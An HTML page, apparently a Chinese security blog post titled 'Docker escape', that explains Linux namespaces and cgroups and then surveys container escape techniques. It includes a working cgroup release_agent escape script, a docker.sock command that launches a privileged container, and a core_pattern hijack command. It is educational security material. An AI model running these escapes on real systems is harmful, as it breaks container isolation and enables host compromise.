@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Docker escape Docker逃逸的本质和硬件虚拟化逃逸的本质有很大的不同，容器逃逸的过程是一个受限进程获取未受限的完整权限，又或某个原本受Cgroup&#x2F;Namespace限制权限的进程获取更多权限的操作，更趋近于提权。  前置知识在开始之前，先看看docker和docker实现相关的技术基础 Linux namespace">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Docker escape">
+<meta property="og:url" content="https://blog.z3ratu1.cn/Docker%20Escape.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="Docker escape Docker逃逸的本质和硬件虚拟化逃逸的本质有很大的不同，容器逃逸的过程是一个受限进程获取未受限的完整权限，又或某个原本受Cgroup&#x2F;Namespace限制权限的进程获取更多权限的操作，更趋近于提权。  前置知识在开始之前，先看看docker和docker实现相关的技术基础 Linux namespace">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-03-10T09:49:23.000Z">
+<meta property="article:modified_time" content="2021-03-12T08:11:49.557Z">
+<meta property="article:author" content="Z3ratu1">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/Docker%20Escape.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Docker escape | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/Docker%20Escape.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Docker escape
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-10 17:49:23" itemprop="dateCreated datePublished" datetime="2021-03-10T17:49:23+08:00">2021-03-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-12 16:11:49" itemprop="dateModified" datetime="2021-03-12T16:11:49+08:00">2021-03-12</time>
+              </span>
+
+          
+            <span id="/Docker%20Escape.html" class="post-meta-item leancloud_visitors" data-flag-title="Docker escape" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/Docker%20Escape.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Docker%20Escape.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Docker-escape"><a href="#Docker-escape" class="headerlink" title="Docker escape"></a>Docker escape</h1><blockquote>
+<p>Docker逃逸的本质和硬件虚拟化逃逸的本质有很大的不同，容器逃逸的过程是一个受限进程获取未受限的完整权限，又或某个原本受Cgroup&#x2F;Namespace限制权限的进程获取更多权限的操作，更趋近于提权。</p>
+</blockquote>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在开始之前，先看看docker和docker实现相关的技术基础</p>
+<h3 id="Linux-namespace"><a href="#Linux-namespace" class="headerlink" title="Linux namespace"></a>Linux namespace</h3><p>Linux命名空间，操作系统内核级别的资源隔离方案。通过命名空间，每个进程只能访问自己所处命名空间的资源，因此每个容器才被做到似乎被隔离的效果。<br>唯有特权用户可以创建命名空间，用户命名空间是一个例外，在Linux3.8后，创建一个<code>user namespace</code>不再需要特权<br>Linux提供了七类资源的隔离机制，分别是：</p>
+<ul>
+<li><code>Mount</code>: 隔离文件系统挂载点</li>
+<li><code>UTS</code>: 隔离主机名和域名信息</li>
+<li><code>IPC</code>: 隔离进程间通信</li>
+<li><code>PID</code>: 隔离进程的ID</li>
+<li><code>Network</code>: 隔离网络资源</li>
+<li><code>User</code>: 隔离用户和用户组的ID</li>
+<li><code>Cgroup</code>:隔离Cgroup根目录（？干什么的，有的资料上没写有这个功能，不过manpage上可以看到确实新加了这个）</li>
+</ul>
+<p>简单的理解，比如这个Mount进行隔离，Linux存在一个系统调用叫做chroot，顾名思义就是更改系统的根目录。只要我将根目录修改到某个子目录下，那么chroot后的文件系统就无法访问到该子目录外部的内容。<br>剩下的资源也是由类似的模式进行了隔离</p>
+<p>单独隔离PID时，虽然新开进程在自己的命名空间中会成为1号进程，但仍能通过ps等命令查看全部进程，这是由于ps读取的是&#x2F;proc目录，需要通过文件系统(Mount)的隔离才能进一步屏蔽</p>
+<p>通过<code>ls -l /proc/$pid/ns | awk &#39;&#123;print $1, $9, $10, $11&#125;&#39;</code>可以看到对应进程所属的命名空间</p>
+<h4 id="clone-unshare-amp-setns"><a href="#clone-unshare-amp-setns" class="headerlink" title="clone,unshare&amp;setns"></a>clone,unshare&amp;setns</h4><p>三个和命名空间相关的系统调用，clone起一个新的线程，通过参数设置命名空间的隔离，unshare使进程脱离某个命名空间，setns则将进程加入到某个命名空间</p>
+<h3 id="Linux-CGroup"><a href="#Linux-CGroup" class="headerlink" title="Linux CGroup"></a>Linux CGroup</h3><p>但即使有了命名空间，只是使得不同进程之间的资源互不影响，并不能限制单个进程对计算机全局资源的占用，因此还需要一个新的东西进行控制，也就是Linux Control Group，用于限制控制和分离一个进程组群的资源（CPU，内存，硬盘）占用</p>
+<h3 id="Rootless-Docker"><a href="#Rootless-Docker" class="headerlink" title="Rootless Docker"></a>Rootless Docker</h3><p>Linux中的隔离容器是基于Linux命名空间的实现的。而创建命名空间需要特权，Docker的基础——挂载文件系统同样也需要特权，所以Docker服务通常都是需要root用户启动的<br>后来人们开发出来Rootless Docker，即不需要特权也能运行的docker，不过这个docker多多少少比普通docker少些功能</p>
+<h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现的关键是利用用户命名空间(<code>user namespace</code>)，上面有提到过Linux3.8之后用户命名空间不需要特权也能创建。用户命名空间可以映射一系列的用户ID，使得内层容器的特权用户(root)映射在外层命名空间时变为普通用户，而Rootless Docker则同时将docker daemon也重新映射到了用户命名空间<br>说白了就是能用非特权用户能创建命名空间了所以也能实现隔离了呗？（猜的）</p>
+<h3 id="x2F-var-x2F-run-x2F-docker-sock"><a href="#x2F-var-x2F-run-x2F-docker-sock" class="headerlink" title="&#x2F;var&#x2F;run&#x2F;docker.sock"></a>&#x2F;var&#x2F;run&#x2F;docker.sock</h3><p>socket一般分为两种，Internet domain socket和Unix domain socket，前者就是我们常说的网络通信socket，基于网络协议，而后者则只能用于进程间通信，基于文件系统<br>docker提供了一个Unix socket支持docker API调用，使用HTTP请求通过docker.sock发送给Docker daemon，使用它，我们就可以运行一些能够管理Docker的Docker容器，比如Portainer、Kubernetes<br><strong>绑定Docker套接字之后，容器的权限会很高，可以控制Docker daemon。</strong></p>
+<h3 id="docker-run参数选项"><a href="#docker-run参数选项" class="headerlink" title="docker run参数选项"></a>docker run参数选项</h3><p><code>docker run [OPTIONS]</code>可以让用户完全控制容器的生命周期，并允许用户覆盖执行<code>docker build</code>时所设定的参数，甚至也可以修改本身由Docker所控制的内核级参数。</p>
+<h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><h3 id="privileged容器内mount-device"><a href="#privileged容器内mount-device" class="headerlink" title="privileged容器内mount device"></a>privileged容器内mount device</h3><p>应该是最经典的docker逃逸，首先需要docker以privileged模式运行<br>当<code>docker run</code>时加上<code>--privileged</code>这个参数，会使得该容器拥有宿主机root权限，设计时最大的用途应该是允许在该容器内再开容器，该类型的docker由于其权限可以看到宿主机上的磁盘等设备，且允许重新挂载目录<br>通过<code>fdisk -l</code>命令查看磁盘文件，非privileged的docker将无法看到磁盘<br>因此privileged容器最常用的逃逸方式就是讲宿主机的根目录挂载进容器内部，对宿主机进行任意文件读写，通过修改crontab，root的authorized_keys等文件完成逃逸</p>
+<h3 id="cap-add-SYS-ADMIN"><a href="#cap-add-SYS-ADMIN" class="headerlink" title="--cap-add SYS_ADMIN"></a>--cap-add SYS_ADMIN</h3><p>Linux内核在2.2版本后引入capabilities机制，允许普通用户执行特权用户才能执行的命令。<br>截至Linux 3.0版本，Linux中共有38种capabilities。Docker容器默认限制为14个capabilities，管理员可以使用--cap-add和--cap-drop选项为容器精确配置capabilities。<br>当docker以privileged模式启动时直接赋予全部capabilities，而add一个SYS_ADMIN的capabilities也允许容器进行挂载等操作，同样可以进行上述利用</p>
+<h3 id="cgroup-release-agent"><a href="#cgroup-release-agent" class="headerlink" title="cgroup release_agent"></a>cgroup release_agent</h3><p>同样需要上述挂载权限，这个应该是一个更不容易被检测的逃逸方法？<br>使用<code>mount -t cgroup -o memory cgroup $mountdir</code>进行挂载<br><del>这几个参数我反正是看不懂，也查不到有用的内容</del></p>
+<h4 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h4><p>使用<code>sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab</code>命令可以得到当前容器根目录在宿主机中的位置，实现宿主机和容器直接的文件共享（把执行命令的结果写进这个文件就可以在容器内看见）<br><code>/etc/mtab</code>文件记录当前的分区挂载情况，不过在没有额外权限的容器内该命令也能获得其在宿主机的目录位置</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>使用一个现成脚本修改Cgroup的release_agent在宿主机中执行命令<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh">privileged&#x2F;1-host-ps.sh</a></p>
+<pre class=" language-shell"><code class="language-shell">#!/bin/bash
+
+set -uex
+
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+ 
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+ 
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+ 
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+sleep 2
+cat "/output"
+</code></pre>
+<h4 id="另一种做法"><a href="#另一种做法" class="headerlink" title="另一种做法"></a>另一种做法</h4><p>或者用这个命令挂载<code>mount -t cgroup -o devices devices $mountdir</code><br><del>这两个命令挂载完之后的目录结构好像没什么区别。。。我感觉就是挂载了同样的东西</del><br>挂载后有一个docker目录，其中存的有全部docker容器的Cgroup配置，找到自己容器id对应的文件夹，通过<code>echo a &gt; $mountdir/docker/$dockerID/devices.allow</code>使容器可以访问全部类型的设备<br>使用<code>mknod</code>创建设备文件，并使用<code>debugfs</code>进行访问，再次获取读写宿主机任意文件的权限</p>
+<pre class=" language-shell"><code class="language-shell">mknod name b 252 1
+debugfs -w name
+</code></pre>
+<h5 id="mknod参数"><a href="#mknod参数" class="headerlink" title="mknod参数"></a>mknod参数</h5><p>mknod的参数还是需要讲一下的，一开始没注意导致复现失败了<br>参数分别是</p>
+<ul>
+<li>文件名：要创建的设备文件名；</li>
+<li>类型：指定要创建的设备文件的类型；</li>
+<li>主设备号：指定设备文件的主设备号；</li>
+<li>次设备号：指定设备文件的次设备号。<br>文件名随便起，类型照抄应该也没事，主次设备号是需要自己去翻一下&#x2F;dev文件夹上那块文件系统的硬盘设备号的，因为是特权容器所以容器内的&#x2F;dev就是宿主机的&#x2F;dev，<code>ls -l</code>对应的文件一下就能看见</li>
+</ul>
+<h3 id="特殊路径挂载"><a href="#特殊路径挂载" class="headerlink" title="特殊路径挂载"></a>特殊路径挂载</h3><p>直接把宿主机的关键文件挂载到docker里来，那就能直接改了。当然大家一般来说不会这么傻</p>
+<h4 id="Docker-in-Docker-docker-sock"><a href="#Docker-in-Docker-docker-sock" class="headerlink" title="Docker in Docker(docker.sock)"></a>Docker in Docker(docker.sock)</h4><p>特殊的常见情形（病句）<br>将宿主机的&#x2F;var&#x2F;run&#x2F;docker.sock挂载进容器内，这样子这个docker就可以通过和docker.sock通信在宿主机内创建任意配置的docker（包括前文的privileged），管理任意容器，这种操作叫Docker in docker（虽然感觉和名字并不是很符合）<br>在新开一个privileged容器就可以再利用上面的办法打通了<br><code>./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it —rm —name rshell -v &quot;/proc:/host/proc&quot; -v &quot;/sys:/host/sys&quot; -v &quot;/:/rootfs&quot; —network=host —privileged=true —cap-add=ALL alpine:latest</code><br>没装docker服务的话也可以试试curl？docker.sock是可以用http协议进行交互的</p>
+<h4 id="容器挂载了-x2F-proc"><a href="#容器挂载了-x2F-proc" class="headerlink" title="容器挂载了&#x2F;proc"></a>容器挂载了&#x2F;proc</h4><p>利用linux的&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern文件，文末有参考链接<br>使用上面提到的trick从mount信息中找出宿主机对应当前容器内部文件结构的路径<br>在容器根目录下面写一个.sh文件，则宿主机对应目录下可以访问到该文件，又容器挂载了宿主机的&#x2F;proc目录，所以可以修改其<code>/proc/sys/kernel/core_pattern</code>文件<br>demo:<code>echo -e &quot;|/var/lib/docker/overlay2/a1a1e60a9967d6497f22f5df21b185708403e2af22eab44cfc2de05ff8ae115f/diff/exp.sh \rcore    &quot; &gt; /host_proc/sys/kernel/core_pattern</code><br>然后想办法触发一个segmentation fault使得我们的.sh脚本被执行即可（随便写个垃圾代码编译上传上去）<br>原理，Linux在进程崩溃时会将崩溃信息写入文件，写入的文件名为&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern中所配置的，若core_pattern的第一个字符为管道符，则会将报错信息传递给管道符后面的程序作为参数并执行该程序</p>
+<h3 id="SYS-PTRACE"><a href="#SYS-PTRACE" class="headerlink" title="SYS_PTRACE"></a>SYS_PTRACE</h3><p>docker容器启动时加了一个<code>--cap-add=SYS_PTRACE</code>的时候可利用，容器如果需要调试什么的就需要添加这个权限，所以应该也比较常见？<br>可以使用<code>capsh --print</code>命令看当前容器的的capabilities（虽然我的容器里好像没有这个命令。。。。）<br>需要找到一个root权限的宿主机进程（大部分都是docker1号进程？），然后对该进程进行注入<br>使用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">infect.c</a>进行注入，在目标机器上编译执行<code>./inject $pid</code>注入</p>
+<h3 id="CVE-2020-15257"><a href="#CVE-2020-15257" class="headerlink" title="CVE-2020-15257"></a>CVE-2020-15257</h3><p>当容器和宿主机共享一个net namespace的时候可以利用<br>抄一个腾讯写好的工具<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn">https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn</a></p>
+<h3 id="脏牛与VDSO"><a href="#脏牛与VDSO" class="headerlink" title="脏牛与VDSO"></a>脏牛与VDSO</h3><p>Linux超级远古的至尊漏洞，Dirty CopyOnWrite<br>利用写入时复制和条件竞争进行任意内存读写的超级漏洞<br>VDSO Virtual Dynamic Shared Object（虚拟动态共享对象）简单来说就是存在在内核空间的.so文件<br>在容器内打VDSO内存中的<code>clock_gettime()</code>进行逃逸<br>网上都有现成的工具</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://coolshell.cn/articles/17010.html">DOCKER基础技术：LINUX NAMESPACE（上）</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://coolshell.cn/articles/17049.html">DOCKER基础技术：LINUX CGROUP</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.docker.com/blog/experimenting-with-rootless-docker/">Experimenting with Rootless Docker</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://dockone.io/article/152">Docker run 命令的使用方法</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/1098">利用 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern隐藏系统后门</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://0x00sec.org/t/linux-infecting-running-processes/1097">[Linux] Infecting Running Processes</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://security.tencent.com/index.php/blog/msg/183">红蓝对抗中的云原生漏洞挖掘及利用实录</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BD3CTF%5D%E8%AE%B0%E5%BD%95.html" rel="prev" title="[D3CTF2021]记录">
+      <i class="fa fa-chevron-left"></i> [D3CTF2021]记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/switch%E5%8A%A0%E9%80%9F%E6%9C%80%E5%90%8E%E4%B8%80%E7%89%88.html" rel="next" title="Switch自建加速终章">
+      Switch自建加速终章 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Docker-escape"><span class="nav-number">1.</span> <span class="nav-text">Docker escape</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-namespace"><span class="nav-number">1.1.1.</span> <span class="nav-text">Linux namespace</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#clone-unshare-amp-setns"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">clone,unshare&amp;setns</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-CGroup"><span class="nav-number">1.1.2.</span> <span class="nav-text">Linux CGroup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rootless-Docker"><span class="nav-number">1.1.3.</span> <span class="nav-text">Rootless Docker</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">实现原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x2F-var-x2F-run-x2F-docker-sock"><span class="nav-number">1.1.4.</span> <span class="nav-text">&#x2F;var&#x2F;run&#x2F;docker.sock</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker-run%E5%8F%82%E6%95%B0%E9%80%89%E9%A1%B9"><span class="nav-number">1.1.5.</span> <span class="nav-text">docker run参数选项</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Docker%E9%80%83%E9%80%B8"><span class="nav-number">1.2.</span> <span class="nav-text">Docker逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#privileged%E5%AE%B9%E5%99%A8%E5%86%85mount-device"><span class="nav-number">1.2.1.</span> <span class="nav-text">privileged容器内mount device</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cap-add-SYS-ADMIN"><span class="nav-number">1.2.2.</span> <span class="nav-text">--cap-add SYS_ADMIN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cgroup-release-agent"><span class="nav-number">1.2.3.</span> <span class="nav-text">cgroup release_agent</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#trick"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">trick</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E5%81%9A%E6%B3%95"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">另一种做法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mknod%E5%8F%82%E6%95%B0"><span class="nav-number">1.2.3.3.1.</span> <span class="nav-text">mknod参数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E8%B7%AF%E5%BE%84%E6%8C%82%E8%BD%BD"><span class="nav-number">1.2.4.</span> <span class="nav-text">特殊路径挂载</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Docker-in-Docker-docker-sock"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">Docker in Docker(docker.sock)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%B9%E5%99%A8%E6%8C%82%E8%BD%BD%E4%BA%86-x2F-proc"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">容器挂载了&#x2F;proc</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SYS-PTRACE"><span class="nav-number">1.2.5.</span> <span class="nav-text">SYS_PTRACE</span></a></li><li class="nav-item nav-level-3"><a 